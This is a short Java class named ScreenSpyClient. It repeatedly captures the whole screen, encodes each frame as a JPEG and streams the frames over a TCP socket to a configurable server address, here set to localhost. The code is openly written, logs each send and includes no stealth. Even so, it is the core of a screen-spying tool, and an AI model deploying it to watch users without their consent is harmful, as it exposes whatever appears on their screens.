package com.client;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;

public class ScreenSpyClient {

    private static String SERVER_IP = "127.0.0.1";
    private static int SERVER_PORT = 13267;

    public static void main(String[] args) throws Exception {
        OutputStream outputStream = null;
        Socket socket = null;
        ByteArrayOutputStream byteArrayOutputStream;
        Robot bot = new Robot();
        Rectangle screenRectangle = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());

        try {

            socket = new Socket();
            socket.connect(new InetSocketAddress(SERVER_IP, SERVER_PORT));

            // Sending
            while (true) {
                outputStream = socket.getOutputStream();
                BufferedImage image = bot.createScreenCapture(screenRectangle);

                byteArrayOutputStream = new ByteArrayOutputStream();
                ImageIO.write(image, "jpg", byteArrayOutputStream);

                int imageSizeBytes = byteArrayOutputStream.size();
                byte[] size = ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN)
                        .putInt(byteArrayOutputStream.size())
                        .array();

                outputStream.write(size);
                outputStream.write(byteArrayOutputStream.toByteArray(), 0, byteArrayOutputStream.size());
                outputStream.flush();
                byteArrayOutputStream.close();

                System.out.println("Flushed: " + imageSizeBytes + " bytes");

                Thread.sleep(100);
            }

        } catch (IOException e) {
            throw new RuntimeException(e);
        } finally {
            if (outputStream != null) outputStream.close();
            assert socket != null;
            socket.close();
        }
    }
}